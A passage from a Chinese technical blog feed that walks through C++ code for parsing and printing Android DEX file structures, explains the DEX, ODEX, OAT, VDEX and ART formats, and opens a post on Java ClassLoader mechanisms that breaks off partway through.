if(!interfaces.empty()) &#123;        printf(&quot;Interfaces:\nNums\t\tInterface\n&quot;);        for(int j=0;j&lt;interfaces.size();j++) &#123;            printf(&quot;%08d\t%s\n&quot;,j+1,parseString(interfaces[j]).c_str());        &#125;    &#125;else &#123;        printf(&quot;No Interfaces\n&quot;);    &#125;&#125;</code></pre><p>​        效果如下（换了一个dex，原本编译的那个太简单，打印出来的内容很少）。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827103109107.png" alt="image-20250827103109107"></p><h5 id="DexAnnotationsDirectoryItem"><a href="#DexAnnotationsDirectoryItem" class="headerlink" title="DexAnnotationsDirectoryItem"></a>DexAnnotationsDirectoryItem</h5><p>​        <strong>annotationsOff</strong> 指向该结构，用于指向类的所有注解,定义如下。</p><pre><code class="language-c++">struct DexAnnotationsDirectoryItem &#123;    u4  classAnnotationsOff;  /* 类注解，值为DexAnnotationSetItem的文件偏移量, 为0表示不存在*/    u4  fieldsSize;           /* 域注解，值为DexFieldAnnotationsItem的数量 */    u4  methodsSize;          /* 方法注解，值为DexMethodAnnotationsItem的数量 */    u4  parametersSize;       /* 参数注解。值为DexParameterAnnotationsItem的数量 */    /* 后3结构中存在1个或多个，则在后面追加以下数据，并按顺序排列 */    /* followed by DexFieldAnnotationsItem[fieldsSize] */    /* followed by DexMethodAnnotationsItem[methodsSize] */    /* followed by DexParameterAnnotationsItem[parametersSize] */&#125;;</code></pre><p>​        <strong>printClassDefAnnotations</strong> 函数用于打印该结构，根据不同注解类型调用不同函数解析。</p><pre><code class="language-c++">// 打印ClassDef的所有Annotationsvoid DexFile::printClassDefAnnotations(DexAnnotationsDirectoryItem&amp; annotationsDirectory) &#123;    //1. 类注解    if(annotationsDirectory.classAnnotationsOff)        printClassAnnotations(*(DexAnnotationSetItem*)(baseAddr+annotationsDirectory.classAnnotationsOff));    else        printf(&quot;No Class Annotations\n\n&quot;);     //2. 域(字段)注解    if(annotationsDirectory.fieldsSize) &#123;        printFieldAnnotations(            (DexFieldAnnotationsItem*)((uintptr_t)&amp;annotationsDirectory                +sizeof(DexAnnotationsDirectoryItem))                ,annotationsDirectory.fieldsSize);    &#125;else        printf(&quot;No Field Annotations\n\n&quot;);     //3. 方法注解    if(annotationsDirectory.methodsSize) &#123;        printMethodAnnotations(            (DexMethodAnnotationsItem*)            ((uintptr_t)&amp;annotationsDirectory            +sizeof(DexAnnotationsDirectoryItem)            +sizeof(DexFieldAnnotationsItem)*annotationsDirectory.fieldsSize)            ,annotationsDirectory.methodsSize);    &#125;else &#123;        printf(&quot;No Method Annotations\n\n&quot;);    &#125;    //4. 参数注解    if(annotationsDirectory.parametersSize) &#123;        printParameterAnnotations(            (DexParameterAnnotationsItem*)((uintptr_t)&amp;annotationsDirectory            +sizeof(DexAnnotationsDirectoryItem)            +sizeof(DexFieldAnnotationsItem)*annotationsDirectory.fieldsSize            +sizeof(DexMethodAnnotationsItem)*annotationsDirectory.methodsSize)            ,annotationsDirectory.parametersSize);    &#125;else &#123;        printf(&quot;No Parameter Annotations\n\n&quot;);    &#125;&#125;</code></pre><h6 id="类注解-DexAnnotationSetItem"><a href="#类注解-DexAnnotationSetItem" class="headerlink" title="类注解 DexAnnotationSetItem"></a>类注解 DexAnnotationSetItem</h6><pre><code class="language-c++">struct DexAnnotationSetItem &#123;    u4  size;                       /* DexAnnotationItem的数量 */    u4  entries[1];                 /* entries数组,存储DexAnnotationItem的文件偏移量 */&#125;; struct DexAnnotationItem &#123;    u1  visibility;                 /* 此注释的预期可见性 */    u1  annotation[1];              /* encoded_annotation格式的注释内容 */&#125;;</code></pre><p>visibility表示注释的可见性，主要有以下几种情况：</p><table><thead><tr><th align="left">名称</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">VISIBILITY_BUILD</td><td align="left">0x00</td><td align="left">预计仅在构建（例如，在编译其他代码期间）时可见</td></tr><tr><td align="left">VISIBILITY_RUNTIME</td><td align="left">0x01</td><td align="left">预计在运行时可见</td></tr><tr><td align="left">VISIBILITY_SYSTEM</td><td align="left">0x02</td><td align="left">预计在运行时可见，但仅对基本系统（而不是常规用户代码）可见</td></tr></tbody></table><p>​        annotation 是采用 encoded_annotation 格式的注释内容,，<strong>encoded_annotation格式</strong> 如下：</p><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">type_idx</td><td align="left">uleb128</td><td align="left">注解的类型，指向DexTypeId列表的索引值</td></tr><tr><td align="left">size</td><td align="left">uleb128</td><td align="left">此注解中 name-value 映射的数量</td></tr><tr><td align="left">elements</td><td align="left">annotation_element[size]</td><td align="left">注解的元素，直接以内嵌形式（不作为偏移量）表示。元素必须按 <code>string_id</code> 索引以升序进行排序。</td></tr></tbody></table><p><strong>annotation_element元素格式</strong>如下：</p><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">name_idx</td><td align="left">uleb128</td><td align="left">元素名称，指向DexStringId列表的索引值</td></tr><tr><td align="left">value</td><td align="left">encoded_value</td><td align="left">元素值</td></tr></tbody></table><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827105400996.png" alt="image-20250827105400996"></p><p>解析代码如下：</p><pre><code class="language-c++">// Annotation functions// 将权限修饰符和方法/类名组合std::string DexFile::combineAccFlagsAndName(std::string accFlags,std::string name) &#123;    std::string result;    if(accFlags.empty())        result=name;//无权限控制关键字,完整名即可    else        result=accFlags+&quot; &quot;+name;    return result;&#125;// 打印DexAnnotationItem结构信息void DexFile::printAnnotation(DexAnnotationItem&amp; annotationItem) &#123;    std::string visibility;//注解可见性    switch(annotationItem.visibility) &#123;        case kDexVisibilityBuild: visibility=&quot;build&quot;;break;        case kDexVisibilityRuntime:visibility=&quot;runtime&quot;;break;        case kDexVisibilitySystem:visibility=&quot;system&quot;;break;        default:visibility=&quot;unknown&quot;;    &#125;    // 解析encoded_annotation    u1* pAnnotation=annotationItem.annotation;    size_t typeSize=0,sizeSize=0;    u4 encoded_annotation_type_idx=myReadUnsignedLeb128(pAnnotation,&amp;typeSize);//注解类型偏移    u4 encoded_annotation_size=myReadUnsignedLeb128(pAnnotation+typeSize,&amp;sizeSize);//注解name-value映射数    std::string encoded_annotation_type=parseString(getTypeIdDataByIndex(encoded_annotation_type_idx));     //Size Visibility Type    printf(&quot;%08d\t%s\t\t%s\n&quot;,encoded_annotation_size,visibility.c_str(),encoded_annotation_type.c_str());     // 解析encoded_annotation.elements    u1* pAnnotationElements=pAnnotation+typeSize+sizeSize;    for(int i=0;i&lt;encoded_annotation_size;i++) &#123;        size_t name_idx_size=0;// name_idx        std::string name=parseString(getStringIdDataByIndex(myReadUnsignedLeb128(pAnnotationElements,&amp;name_idx_size)));        size_t valueSize=0;        std::string value=parseString(parseEncodedValue(pAnnotationElements+name_idx_size,valueSize));        printf(&quot;\t%s=%s\n&quot;,name.c_str(),value.c_str());    &#125;&#125;// 打印DexAnnotationSetItem信息 即多个DexAnnotationItem结构void DexFile::printAnnotationSet(DexAnnotationSetItem&amp; annotationSet) &#123;    printf(&quot;Size\t\tVisibility\tType\n&quot;);    //AnnotationSetItem.entries[] 数组保存AnnotationItem结构的文件偏移值    for(int j=0;j&lt;annotationSet.size;j++) &#123;        printAnnotation(*(DexAnnotationItem*)(annotationSet.entries[j]+baseAddr));    &#125;&#125;// 打印所有类注解 DexAnnotationSetItemvoid DexFile::printClassAnnotations(DexAnnotationSetItem&amp; classAnnotations) &#123;    printf(&quot;Class Annotations start at %#llx, contains %d entries\n&quot;,(uintptr_t)classAnnotations.entries-(uintptr_t)baseAddr,classAnnotations.size);    printAnnotationSet(classAnnotations);    printf(&quot;Class Annotations End\n\n&quot;);&#125;</code></pre><h6 id="域注解-DexFieldAnnotationsItem"><a href="#域注解-DexFieldAnnotationsItem" class="headerlink" title="域注解 DexFieldAnnotationsItem"></a>域注解 DexFieldAnnotationsItem</h6><p>定义如下</p><pre><code class="language-c++">struct DexFieldAnnotationsItem &#123;    u4  fieldIdx;                   /* 指向DexFieldId列表的索引值 */    u4  annotationsOff;             /* DexAnnotationSetItem的文件偏移量 */&#125;;</code></pre><p>​        由于指向 <strong>DexAnnotationSetItem 结构</strong>，故解析方式和类注解类似。</p><pre><code class="language-c++">// 打印所有域注解 DexFieldAnnotationsItemvoid DexFile::printFieldAnnotations(DexFieldAnnotationsItem* pFieldAnnotations,u4 fieldsNum) &#123;    printf(&quot;Field Annotations start at %#llx, contains %d entries\n&quot;,(uintptr_t)pFieldAnnotations-(uintptr_t)baseAddr,fieldsNum);    for(int i=0;i&lt;fieldsNum;i++) &#123;        std::string field=getFieldIdDataByIndex(pFieldAnnotations[i].fieldIdx);        printf(&quot;Field%d:\t%s\n&quot;,i+1,field.c_str());        printAnnotationSet(*(DexAnnotationSetItem*)(baseAddr+pFieldAnnotations[i].annotationsOff));    &#125;    printf(&quot;Field Annotations End\n\n&quot;);&#125;</code></pre><h6 id="方法注解-DexMethodAnnotationsItem"><a href="#方法注解-DexMethodAnnotationsItem" class="headerlink" title="方法注解 DexMethodAnnotationsItem"></a>方法注解 DexMethodAnnotationsItem</h6><p>定义如下</p><pre><code class="language-c++">/* * Direct-mapped &quot;method_annotations_item&quot;. */struct DexMethodAnnotationsItem &#123;    u4  methodIdx;                  /* 指向DexMethodId列表的索引值 */    u4  annotationsOff;             /* DexAnnotationSetItem的文件偏移量 */&#125;;</code></pre><p>解析方法类似</p><pre><code class="language-c++">// 打印方法注解 DexMethodAnnotationsItemvoid DexFile::printMethodAnnotations(DexMethodAnnotationsItem* pMethodAnnotations,u4 methodsNum) &#123;    printf(&quot;Method Annotations start at %#llx, contains %d entries\n&quot;,(uintptr_t) pMethodAnnotations-(uintptr_t)baseAddr,methodsNum);    for(int i=0;i&lt;methodsNum;i++) &#123;        std::string method=getMethodIdDataByIndex(pMethodAnnotations[i].methodIdx);        printf(&quot;Method%d:\t%s\n&quot;,i+1,method.c_str());        printAnnotationSet(*(DexAnnotationSetItem*)(baseAddr+ pMethodAnnotations[i].annotationsOff));    &#125;    printf(&quot;Method Annotations End\n\n&quot;);&#125;</code></pre><h6 id="参数注解-DexParameterAnnotationsItem"><a href="#参数注解-DexParameterAnnotationsItem" class="headerlink" title="参数注解 DexParameterAnnotationsItem"></a>参数注解 DexParameterAnnotationsItem</h6><p>定义如下</p><pre><code class="language-c++">/* * Direct-mapped &quot;parameter_annotations_item&quot;. */struct DexParameterAnnotationsItem &#123;    u4  methodIdx;                  /* 指向DexMethodId列表的索引值 */    u4  annotationsOff;             /* DexAnotationSetRefList的文件偏移量 */&#125;;</code></pre><p>DexAnotationSetRefList 结构体定义如下</p><pre><code class="language-c++">/* * Direct-mapped &quot;annotation_set_ref_list&quot;. */struct DexAnnotationSetRefList &#123;    u4  size;                           /* 列表中元素个数，即DexAnnotationSetRefItem的个数 */    DexAnnotationSetRefItem list[1];    /* 第一个DexAnnotationSetRefItem的内容，非偏移量 */&#125;; /* * Direct-mapped &quot;annotation_set_ref_item&quot;. */struct DexAnnotationSetRefItem &#123;    u4  annotationsOff;             /* DexAnnotationSetItem的偏移量 */&#125;;</code></pre><p>解析方法略有不同，代码如下</p><pre><code class="language-c++">// 打印DexAnnotationSetRefListvoid DexFile::printAnnotationSetRefList(DexAnnotationSetRefList&amp; annotationSetRefList) &#123;    printf(&quot;AnnotationSetRefList contains %d AnnotationSetItems\n&quot;,annotationSetRefList.size);    // AnnotationSetRefList.list是AnnotationSetRefItem数组    DexAnnotationSetRefItem* pAnnotationSetRefItem=annotationSetRefList.list;    for(int i=0;i&lt;annotationSetRefList.size;i++) &#123;        if(!pAnnotationSetRefItem[i].annotationsOff) &#123;            printf(&quot;No This Annotation Set!\n&quot;);//可能存在空项            continue;        &#125;        //AnnotationSetRefItem.annotationsOff指向AnnotationSetItem结构        printAnnotationSet(*(DexAnnotationSetItem*)(baseAddr+pAnnotationSetRefItem[i].annotationsOff));    &#125;    printf(&quot;AnnotationSetRefList End\n&quot;);&#125;// 打印参数注解 DexParameterAnnotationsItemvoid DexFile::printParameterAnnotations(DexParameterAnnotationsItem* pParameterAnnotations,u4 parametersNum) &#123;    printf(&quot;Parameter Annotations start at %#llx, contains %d entries\n&quot;,(uintptr_t) pParameterAnnotations-(uintptr_t)baseAddr,parametersNum);    for(int i=0;i&lt;parametersNum;i++) &#123;        std::string method=getMethodIdDataByIndex(pParameterAnnotations[i].methodIdx);        printf(&quot;Method%d:\t%s\n&quot;,i+1,method.c_str());        // PatameterAnnotationsItem.annotationsOff指向DexAnnotationSetRefList结构,和其他三个不同        printAnnotationSetRefList(*(DexAnnotationSetRefList*)(baseAddr+pParameterAnnotations[i].annotationsOff));        printf(&quot;\n&quot;);    &#125;    printf(&quot;Parameter Annotations End\n\n&quot;);&#125;</code></pre><h5 id="DexClassData"><a href="#DexClassData" class="headerlink" title="DexClassData"></a>DexClassData</h5><p>​        定义在 <a href="http://androidxref.com/2.3.7/xref/dalvik/libdex/DexClass.h">http://androidxref.com/2.3.7/xref/dalvik/libdex/DexClass.h</a> 中。</p><p>​        注意：<strong>DexClass.h定义的结构体中,u4类型实际类型为uleb128</strong>。</p><pre><code class="language-c++">/* expanded form of class_data_item. Note: If a particular item is * absent (e.g., no static fields), then the corresponding pointer * is set to NULL. */typedef struct DexClassData &#123;    DexClassDataHeader header;    DexField*          staticFields;    //下面4个连续数组,如果对应长度存在才有效    DexField*          instanceFields;  //按顺序排列    DexMethod*         directMethods;    DexMethod*         virtualMethods;&#125; DexClassData;</code></pre><p>​        内部的结构体定义如下：</p><p><strong>注意</strong>：u4 均为 uleb128，所以这些结构大小不固定，无法通过 sizeof 计算，需要手动计算。</p><pre><code class="language-c++">/* expanded form of a class_data_item header */typedef struct DexClassDataHeader &#123;    u4 staticFieldsSize;    u4 instanceFieldsSize;    u4 directMethodsSize;    u4 virtualMethodsSize;&#125; DexClassDataHeader; /* expanded form of encoded_field */typedef struct DexField &#123;    u4 fieldIdx;    /* index to a field_id_item */    u4 accessFlags;&#125; DexField; /* expanded form of encoded_method */typedef struct DexMethod &#123;    u4 methodIdx;    /* index to a method_id_item */    u4 accessFlags;    u4 codeOff;      /* file offset to a code_item */&#125; DexMethod;</code></pre><p>​        其中 codeOff 指向 DexCode 结构，定义如下：</p><pre><code class="language-c++">/* * Direct-mapped &quot;code_item&quot;. * * The &quot;catches&quot; table is used when throwing an exception, * &quot;debugInfo&quot; is used when displaying an exception stack trace or * debugging. An offset of zero indicates that there are no entries. */struct DexCode &#123;    u2  registersSize;      /* 使用的寄存器个数 */    u2  insSize;            /* 参数个数 */    u2  outsSize;           /* 调用其他方法时使用的寄存器个数 */    u2  triesSize;          /* try_item的个数 */    u4  debugInfoOff;       /* 指向调试信息的文件偏移量 */    u4  insnsSize;          /* 指令集个数，以2字节为单位 */    u2  insns[1];           /* 指令集，insns 数组中的代码格式由随附文档 Dalvik 字节码指定 */    /* 如果 triesSize 不为零，下面存在*/    /* 两字节填充，使下面的try_item实现4字节对齐 */    /* followed by try_item[triesSize]，用于表示代码中捕获异常的位置以及如何对异常进行处理的数组 */    /* followed by uleb128 handlersSize */    /* followed by catch_handler_item[handlersSize]，用于表示“捕获类型列表和关联处理程序地址”的列表的字节 */&#125;;</code></pre><p>解析代码如下：</p><pre><code class="language-c++">// 打印DexCode Todo: 解析DexCode字段void DexFile::printDexCode(DexCode&amp; dexCode) &#123;    // 打印基本信息    printf(&quot;DexCode:\n&quot;);    printf(&quot;RegsNum\t\tParamsNum\tOutsNum\t\tTriesNum\tDebugInfoOff\tInsnsNum\tInsnsOff\n&quot;);    printf(&quot;%08d\t%08d\t%08d\t%08d\t%08x\t%08d\t%08x\n&quot;,dexCode.registersSize,dexCode.insSize,dexCode.outsSize,dexCode.triesSize,dexCode.debugInfoOff,dexCode.insnsSize,(uintptr_t)dexCode.insns-(uintptr_t)baseAddr);    // 打印    printf(&quot;DexCode End\n&quot;);&#125;// 打印DexClassData的DexField项目 返回对应数组结构的大小unsigned int DexFile::printClassDataItem(DexField* pFields,u4 fieldsNum) &#123;    u4 prevFieldIndex=0,offset=0;    for(int i=0;i&lt;fieldsNum;i++) &#123;        DexField*  pField=(DexField*)((uintptr_t)pFields+offset);        // 注意由于内部元素为uleb128类型,所以DexField大小并不固定,需要计算        size_t fieldIndexSize=0,accessFlagsValueSize=0;        u4 fieldIndex=myReadUnsignedLeb128((u1*)pField,&amp;fieldIndexSize);        u4 accessFlagsValue=myReadUnsignedLeb128((u1*)pField+fieldIndexSize,&amp;accessFlagsValueSize);         std::string fieldName=getFieldIdDataByIndex(prevFieldIndex+fieldIndex);        std::string accessFlags=parseAccessFlags(accessFlagsValue);        printf(&quot;Field%d: %s\n&quot;,i+1,combineAccFlagsAndName(accessFlags,fieldName).c_str());         prevFieldIndex+=fieldIndex;// 更新前一个filedIndex        offset+=fieldIndexSize+accessFlagsValueSize;//当前数组结构的偏移    &#125;    return offset;//返回当前数组大小&#125;// 打印DexClassData的DexMethod项目 返回对应数组结构的大小unsigned int DexFile::printClassDataItem(DexMethod* pMethods,u4 methodsNum)&#123;    u4 prevMethodIndex=0,offset=0;    for(int i=0;i&lt;methodsNum;i++) &#123;        DexMethod* pMethod=(DexMethod*)((uintptr_t)pMethods+offset);        size_t methodIndexSize=0,accessFlagsValueSize=0,codeOffSize=0;// 相比DexField多了codeOff,指向DexCode结构        u4 methodIndex=myReadUnsignedLeb128((u1*)pMethod,&amp;methodIndexSize);        u4 accessFlagsValue=myReadUnsignedLeb128((u1*)pMethod+methodIndexSize,&amp;accessFlagsValueSize);        u4 codeOff=myReadUnsignedLeb128((u1*)pMethod+methodIndexSize+accessFlagsValueSize,&amp;codeOffSize);         std::string methodName=getMethodIdDataByIndex(prevMethodIndex+methodIndex);        std::string accessFlags=parseAccessFlags(accessFlagsValue);        printf(&quot;Method%d: %s\n&quot;,i+1,combineAccFlagsAndName(accessFlags,methodName).c_str());        if(codeOff) &#123;            printf(&quot;CodeOff: %08x\n&quot;,codeOff);            printDexCode(*(DexCode*)(baseAddr+codeOff));//打印codeOff指向的DexCode        &#125;        else            printf(&quot;No DexCode\n&quot;);        prevMethodIndex+=methodIndex;        offset+=methodIndexSize+accessFlagsValueSize+codeOffSize;    &#125;    return offset;&#125;// 打印DexClassDatavoid DexFile::printClassDefClassData(DexClassData&amp; classData) &#123;    printf(&quot;ClassData:\n&quot;);    // 1.解析DexClassDataHeader 获取各uleb128字段保存的长度    const u1* pClassDataHeader=(u1*)&amp;classData.header;    const u1** pPClassDataHeader=&amp;pClassDataHeader;    u4 staticFieldsNum=readUnsignedLeb128(pPClassDataHeader);    u4 instanceFieldsNum=readUnsignedLeb128(pPClassDataHeader);    u4 directMethodsNum=readUnsignedLeb128(pPClassDataHeader);    u4 virtualMethodsNum=readUnsignedLeb128(pPClassDataHeader);    // pointer指向DexClassDataHeader后方第一个字节(即4个数组的内容),用于后续计算    uintptr_t pointer=((uintptr_t)&amp;classData+unsignedLeb128Size(staticFieldsNum)                                +unsignedLeb128Size(instanceFieldsNum)                                +unsignedLeb128Size(directMethodsNum)                                +unsignedLeb128Size(virtualMethodsNum));     // 2. 解析各个字段(判断是否存在对应字段)    // 注意:    // 1. fieldIdx和accessFlags均为uleb128类型    // 2. 数组首个fieldIndex和methodIndex是正确的,后续index是相对前一个index的偏移值(大部分为1)    // 3. 由于各个结构大小不固定,但是四个数组是连续的,所以要使用offset记录前方数据的大小    unsigned int offset=0;     if(staticFieldsNum) &#123;        printf(&quot;ClassData contains %d Static Fields:\n&quot;,staticFieldsNum);        offset+=printClassDataItem((DexField*)(pointer+offset),staticFieldsNum);        printf(&quot;Static Fields End\n&quot;);    &#125;    else &#123;        printf(&quot;No Static Field\n&quot;);    &#125;     if(instanceFieldsNum) &#123;        printf(&quot;ClassData contains %d Instance Fields:\n&quot;,instanceFieldsNum);        offset+=printClassDataItem((DexField*)(pointer+offset),staticFieldsNum);        printf(&quot;Instance Fields End\n&quot;);    &#125;    else &#123;        printf(&quot;No Instance Field\n&quot;);    &#125;     if(directMethodsNum) &#123;        printf(&quot;ClassData contains %d Directed Methods:\n&quot;,directMethodsNum);        offset+=printClassDataItem((DexMethod*)(pointer+offset),directMethodsNum);        printf(&quot;Directed Methods End\n&quot;);    &#125;    else &#123;        printf(&quot;No Directed Method\n&quot;);    &#125;     if(virtualMethodsNum) &#123;        printf(&quot;ClassData contains %d Virtual Methods:\n&quot;,virtualMethodsNum);        offset+=printClassDataItem((DexMethod*)(pointer+offset),virtualMethodsNum);        printf(&quot;Virtual Methods End\n&quot;);    &#125;    else &#123;        printf(&quot;No Virtual Method\n&quot;);    &#125;    printf(&quot;ClassData End\n&quot;);&#125;</code></pre><h5 id="DexEncodedArray"><a href="#DexEncodedArray" class="headerlink" title="DexEncodedArray"></a>DexEncodedArray</h5><p>定义如下</p><pre><code class="language-c++">struct DexEncodedArray &#123;    u1  array[1];       //encoded_array格式的数据&#125;;</code></pre><p>​        encoded_array 格式定义如下：</p><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">size</td><td align="left">uleb128</td><td align="left">表示数组中的元素数量</td></tr><tr><td align="left">values</td><td align="left">encoded_value[size]</td><td align="left">采用encoded_value编码的数据</td></tr></tbody></table><p>解析代码如下</p><pre><code class="language-c++">// 打印StaticValues 实际为DexEncodedArray结构void DexFile::printClassDefStaticValues(DexEncodedArray&amp; encodedArray) &#123;    size_t sizeLen=0;    u4 size=myReadUnsignedLeb128((u1*)&amp;encodedArray,&amp;sizeLen);    u1* pValues=(u1*)&amp;encodedArray+sizeLen;    printf(&quot;StaticValues contains %d values\n&quot;,size);    size_t offset=0,readSize=0;// offset保存前方已访问的结构大小,readSize为单次读取的大小    for(int i=0;i&lt;size;i++) &#123;        printf(&quot;%s\n&quot;,parseEncodedValue(pValues+offset,readSize).c_str());        offset+=readSize;    &#125;    printf(&quot;StaticValues End\n&quot;);&#125;</code></pre><hr><h4 id="Android-系统可执行文件"><a href="#Android-系统可执行文件" class="headerlink" title="Android 系统可执行文件"></a>Android 系统可执行文件</h4><h5 id="从-JVM-到-Dalvik-再到-ART"><a href="#从-JVM-到-Dalvik-再到-ART" class="headerlink" title="从 JVM 到 Dalvik 再到 ART"></a>从 JVM 到 Dalvik 再到 ART</h5><ol><li>JVM 是 Java语言的虚拟机，运行 .class 文件；</li><li>Dalvik 是 Google 设计的用于 Android 平台的虚拟机，运行 .dex 文件；JVM 基于<strong>栈</strong>，DVM 基于<strong>寄存器</strong>，可以做到更好的提前优化，并且运行速度更快。</li><li>Android 4.4 首次提出 <strong>ART 虚拟机</strong>，在 Android 5.0 后弃用 Dalvik，默认使用ART，运行 oat 文件。DVM 应用运行时，字节码需要通过<strong>即时编译器 JIT</strong> 转换为机器码运行；ART 则在应用第一次安装时，预先将字节码编译为机器码，该过程称之为预编译(AOT Ahead of time)。</li></ol><h5 id="DEX"><a href="#DEX" class="headerlink" title="DEX"></a>DEX</h5><ol><li>.java文件经 javac 编译后生成 .class 文件，再通过 dx&#x2F;d8 生成 .dex 文件；</li><li>Dalvik 虚拟机运行 .dex 文件，一个 apk 包内可能含有多个 dex 文件。</li></ol><h5 id="ODEX"><a href="#ODEX" class="headerlink" title="ODEX"></a>ODEX</h5><p>​        Android5.0前，使用 Dalvik 虚拟机，ODEX 是 Dalvik 对 Dex 文件优化后的产物， 通常存放在 &#x2F;data&#x2F;dalvik-cache目录下。运行程序时直接加载 ODEX 文件，避免重复验证和优化；Android 5.0后，使用 ART 虚拟机，.ODEX 实际上是OAT 文件(ART定制的ELF文件)。</p><h5 id="OAT"><a href="#OAT" class="headerlink" title="OAT"></a>OAT</h5><ol><li>OAT 文件是 Android4.4 中引入的,，Android5.0 后，系统默认虚拟机为ART；</li><li>OAT 文件即是 ART 虚拟机对 Dex 优化后的产物，是Android 定制的 ELF 文件；</li><li>OAT 文件结构随 Android 版本变化而变化，没有向后兼容性。</li></ol><h5 id="VDEX"><a href="#VDEX" class="headerlink" title="VDEX"></a>VDEX</h5><p>​        VDEX 文件在 Android 8.0 后引入，不是 Android 系统的可执行文件。</p><p>​        Android 8.0 后，dex2oat 将 class.dex 优化生成 2 个文件: OAT 文件(.odex)和 VDEX 文件(.vdex)。</p><ul><li>.odex 文件包含了本机代码的 OAT 文件；</li><li>.vdex 文件包含了原始的 dex 文件<strong>副本</strong>；</li><li>vdex 文件同 oat 文件一样，随系统版本变化，且没有向后兼容性。</li></ul><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827111424803.png" alt="image-20250827111424803"></p><h5 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h5><p>​        .art 文件是一种 ELF 可执行文件，借助 odex 文件优化生成，记录应用启动的热点函数相关地址，便于寻址加速。</p><p>​        .art文件结构随 Android 版本变化，无向后兼容性。</p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ClassLoader 机制</title>
      <link href="/2025/08/19/ClassLoader%20%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/08/19/ClassLoader%20%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="ClassLoader-机制"><a href="#ClassLoader-机制" class="headerlink" title="ClassLoader 机制"></a>ClassLoader 机制</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​        几乎所有主流的 Android 加固方案都离不开 <strong>ClassLoader</strong> 机制，那么想进一步学习理解 Android 加固自然就得较为系统的学习一下这块知识了。刚好看雪上有位大佬系统的讲解了 Android 加固各代壳从入门到入土，在入门就讲解了这部分内容，记录一下。</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><p>​        热修复和插件化技术依赖于 ClassLoader，<strong>JVM</strong> 虚拟机运行class 文件,而 <strong>Dalvik&#x2F;ART</strong> 运行 dex 文件,所以它们的ClassLoader 有部分区别。</p><h4 id="Java-中的-ClassLoader"><a href="#Java-中的-ClassLoader" class="headerlink" title="Java 中的 ClassLoader"></a>Java 中的 ClassLoader</h4><p>Java的ClassLoader分为两种：</p><ul><li><strong>系统类加载器</strong><br>BootstrapClassLoader, ExtensionsClassLoader, ApplicationClassLoader</li><li><strong>自定义类加载器</strong><br>Custom ClassLoader, 通过继承 java.lang.ClassLoader 实现</li></ul><p>具体分析如下：</p><ol><li>Bootstrap ClassLoader (引导类加载器)<br>    是使用 C&#x2F;C++ 实现的加载器(不能被 Java 代码访问)，用于加载 JDK 的核心类库，例如 java.lang 和 java.util 等系统类；会加载 JAVA_HOME&#x2F;jre&#x2F;lib 和 -Xbootclasspath 参数指定的目录；JVM 虚拟机的启动就是通过 Bootstrap ClassLoader 创建的初始类完成的。</li></ol><p>​        可以通过如下代码得出其加载的目录(java8)</p><pre><code class="language-Java">public class Test0 &#123;        public static void main(String[] args) &#123;            System.out.println(System.getProperty(&quot;sun.boot.class.path&quot;));        &#125;&#125;</code></pre><p>效果如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819175152837.png" alt="image-20250819175152837"></p><ol start="2"><li>Extensions ClassLoader (拓展类加载器)<br>    该类在 Java 中的实现类为 ExtClassLoader，用于加载 java的拓展类，提供除系统类之外的额外功能；用于加载JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;ext 和 java.ext.dir 指定的目录。</li></ol><p>​        以下代码可以打印ExtClassLoader的加载目录：</p><pre><code class="language-Java">public class JavaClassLoaderTest &#123;        public static void main(String[] args) &#123;            System.out.println(System.getProperty(java.ext.dirs));        &#125;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819175353173.png" alt="image-20250819175353173"></p><ol start="3"><li><p>Application ClassLoader (应用程序类加载器)<br>    对应的实现类为 AppClassLoader，又可以称作 System ClassLoader(系统类加载器)，因为它可以通过<strong>ClassLoader.getSystemClassLoader()</strong> 方法获取；用于加载程序的 Classpath 目录和系统属性 java.class.path 指定的目录。</p></li><li><p>Custom ClassLoader (自定义加载器)<br>    除了以上3个系统提供的类加载器之外，还可以通过继承java.lang.ClassLoader 实现自定义类加载器；Extensions 和 Application ClassLoader 也继承了该类。</p></li></ol><hr><h5 id="ClassLoader-的继承关系"><a href="#ClassLoader-的继承关系" class="headerlink" title="ClassLoader 的继承关系"></a>ClassLoader 的继承关系</h5><p>运行一个Java程序需要几种类型的类加载器呢？可以使用如下代码验证</p><pre><code class="language-Java">public class JavaClassLoaderTest &#123;        public static void main(String[] args) &#123;            ClassLoader loader=JavaClassLoaderTest.class.getClassLoader();            while(loader!=null)&#123;              System.out.println(loader);              loader=loader.getParent();            &#125;        &#125;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819175638009.png" alt="image-20250819175638009"></p><p>​        打印出了 <strong>AppClassLoader</strong> 和 <strong>ExtClassLoader</strong>，由于BootstrapClassLoader 由 C&#x2F;C++ 编写，并非Java类，所以无法在 Java 中获取它的引用。</p><p>注意：</p><pre><code>1.系统提供的类加载器有 3 种类型，但是系统提供的 ClassLoader 不止 3 个；1.**AppClassLoader** 的**父类加载器**为 **ExtClassLoader**，不代表 AppClassLoader 继承自ExtClassLoader（因为这里所说的 **父类加载器** 指的是 **委派关系**，而并非 **继承关系**）。</code></pre><p>ClassLoader 的 <strong>继承关系</strong> 如下图所示：</p><pre><code>1. ClassLoader 是一个**抽象类**，定义了ClassLoader 